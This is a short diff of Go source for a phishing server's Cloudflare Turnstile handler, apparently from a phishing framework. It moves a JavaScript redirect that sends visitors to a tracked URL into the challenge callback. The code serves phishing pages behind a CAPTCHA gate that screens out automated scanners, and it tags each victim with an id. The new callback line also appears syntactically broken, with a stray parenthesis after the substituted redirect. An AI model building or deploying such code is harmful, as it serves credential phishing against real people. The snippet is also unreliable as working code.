@@ -335,7 +335,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 			sitekey: '%s',
 			callback: function(token) {
 				console.log(`+"`Challenge Success ${token}`);"+`
-				return fetch("%s", {
+				fetch("%s", {
 					method: "POST",
 					body: JSON.stringify({
 					  "ts-submit": true,
@@ -344,7 +344,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 					headers: {
 					  "Content-type": "application/json; charset=UTF-8"
 					}
-				}).then((response) => {console.log(response); return response.text()});
+				}).then((response) => {console.log("redirecting..."); %s);});
 			},
 		});
 	};</script>`
@@ -377,16 +377,15 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 				cookie.HttpOnly = true
 				cookie.Path = "/"
 				http.SetCookie(w, &cookie)
-				// set redirect
-				redirect := `<script>window.location.replace('https://` + r.Host + `/?sq=` + rid + `');</script>`
-				fmt.Fprint(w, redirect)
 			} else {
 				fmt.Fprint(w, fmt.Sprintf(message, "Please try again."))
 			}
 		}
 	}
 	if ps.config.TurnstilePublicKey != "" {
-		fmt.Fprint(w, fmt.Sprintf(body, ps.config.TurnstilePublicKey, r.URL.RequestURI()))
+		// set redirect
+		redirect := `window.location.replace('https://` + r.Host + `/?sq=` + rid + `');`
+		fmt.Fprint(w, fmt.Sprintf(body, ps.config.TurnstilePublicKey, r.URL.RequestURI(), redirect))
 		fmt.Fprint(w, pageBottom)
 	} else {
 		w.WriteHeader(http.StatusForbidden)
